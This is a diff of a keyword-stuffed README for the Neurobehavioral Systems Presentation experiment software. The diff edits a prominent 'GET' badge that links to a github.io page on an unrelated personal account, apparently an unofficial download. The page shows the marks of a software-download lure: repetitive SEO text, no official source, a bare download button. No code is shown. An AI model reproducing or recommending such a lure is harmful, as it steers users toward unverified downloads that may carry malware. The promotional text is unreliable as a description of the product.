@@ -1,7 +1,7 @@
 
 # Neurobehavioral Systems Presentation
 
-[![GET](https://img.shields.io/badge/GET%20%E2%80%94%20Presentation-0078D6?style=for-the-badge&logoColor=white)](https://lawcewiczlilia.github.io/.github/Presentation)
+[![GET](https://img.shields.io/badge/GET%20%E2%80%94%20-0078D6?style=for-the-badge&logoColor=white)](https://lawcewiczlilia.github.io/.github/Presentation)
 
 
 Neurobehavioral Systems Presentation is a scripting-based tool for running behavioral and neuroscience experiments with precise timing. With Neurobehavioral Systems Presentation experiment control, you can design trials for psychophysics, fMRI, and related paradigms. Neurobehavioral Systems Presentation stimulus delivery supports visual, auditory, and multimodal presentations. The software is known for Neurobehavioral Systems Presentation fMRI compatibility in scanner environments. Neurobehavioral Systems Presentation scripting gives experienced users fine control over experiment logic. For teaching and small lab work, Neurobehavioral Systems Presentation neuroscience lab workflows stay organized and repeatable.
